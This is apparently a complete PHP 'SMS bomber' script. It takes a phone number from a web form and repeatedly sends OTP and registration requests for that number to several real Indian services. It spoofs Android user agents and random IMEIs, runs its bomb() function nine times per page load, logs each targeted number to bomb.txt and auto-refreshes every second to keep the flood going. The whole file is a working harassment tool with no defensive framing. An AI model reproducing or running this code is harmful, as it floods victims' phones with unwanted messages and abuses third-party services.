<?php
$phn=$_REQUEST['no'];
if(!$phn){
echo "<form action='' method='get'><b>
<input class ='material' placeholder='Mobile' type='text' name='no' /><br />
<br>
<input id='submit' class ='button' type='submit' value='Submit' /><br />
</form>";
die();
}
function rando($length) {
$characters = '0123456789abcdefghijklmnopqrstuvwxyz';
$charactersLength = strlen($characters);
$randomString = '';
for ($i = 0; $i < $length; $i++) {
$randomString .= $characters[rand(0, $charactersLength - 1)];
}
return $randomString;
}
$ai = rando(16);
$imei = rand(1111111111111111,9999999999999999);
$ma = implode(':',str_split(substr(md5(mt_rand()),0,12),2));
$mac = urlencode($ma);
$adv = implode('-',str_split(substr(md5(mt_rand()),0,36),8));
$email = rando(13);
function bomb($phn){
$imei = rand(1111111111111111,9999999999999999);
$url9 = "http://securedapi.confirmtkt.com/api/platform/register?mobileNumber=$phn";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url9);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER,
array(
'connection: Keep-Alive',
'User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)',
'Host: securedapi.confirmtkt.com'
)
);
$result9 = curl_exec($ch);
curl_close($ch);
$url1 = 'http://m.fashalot.com/mobileactions/v2/requestOtp';
$data1 = "imei_id=$imei&os=Android&v=2&app_ver=2.1&mobile=$phn&";
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch,CURLOPT_URL, $url1);
curl_setopt($ch,CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch,CURLOPT_POSTFIELDS, $data1);
curl_setopt($ch, CURLOPT_HTTPHEADER,
array(
'Content-Type: application/x-www-form-urlencoded',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; HTC Desire 526GPLUS dual sim Build/KOT49H)',
'Host: m.fashalot.com',
'Connection: Keep-Alive'
)
);
$result1 = curl_exec($ch);
echo $result1;
curl_close($ch);
$url2 = "http://offers.lenskart.com/sendopt.php?ph=$phn&operation=start&ts=1376044348191";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url2);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result2 = curl_exec($ch);
curl_close($ch);
$url4 = "http://www.justdial.com/functions/ajxandroid.php?phn=91$phn&type=1";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url4);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result4 = curl_exec($ch);
curl_close($ch);
$url14 = 'https://api.im.hike.in/v1/account/validate?digits=4 ';
$data14 = '{"phone_no":"+91'.$phn.'"}';
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch,CURLOPT_URL, $url14);
curl_setopt($ch,CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch,CURLOPT_POSTFIELDS, $data14);
curl_setopt($ch, CURLOPT_HTTPHEADER,
array(
'User-Agent: android-4.2.5.82',
'Cache-Control: no-transform',
'Content-Type: application/json',
'Host: api.im.hike.in',
'Connection: Keep-Alive',
'Accept-Encoding: gzip'
)
);
$result14 = curl_exec($ch);
curl_close($ch);
$url73 = 'http://www.eazyfi.com/mobileapp/ezinstitute.php';
$qry_st73 = "method=newregister&mobile=$phn&email=&name=ftgyyyyy&code=";
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL, $url73);
curl_setopt($ch,CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
curl_setopt($ch,CURLOPT_POSTFIELDS, $qry_st73);
curl_setopt($ch, CURLOPT_HTTPHEADER ,
array(
'User-Agent: c8969fcd9e67710b0680e2266834cf80',
'Host: www.eazyfi.com',
'Connection: Keep-Alive',
'Content-Type: application/x-www-form-urlencoded'
)
);
$server_output = curl_exec ($ch);
echo $server_output;
curl_close ($ch);
}
$r1= bomb($phn);
$r1= bomb($phn);
$r1= bomb($phn);
$r1= bomb($phn);
$r1= bomb($phn);
$r1= bomb($phn);
$r1= bomb($phn);
$r1= bomb($phn);
$r1= bomb($phn);
date_default_timezone_set('Asia/Kolkata'); 
$date = date('d-m-Y H:i');
$dateFile = "bomb.txt"; 
$dataString = "Date:".$date." - Mobile:" . $phn ."\n"; 
$fWrite = fopen($dateFile,"a"); 
$wrote = fwrite($fWrite, $dataString); 
fclose($fWrite);
?>
<?php
header("refresh: 1;");
?>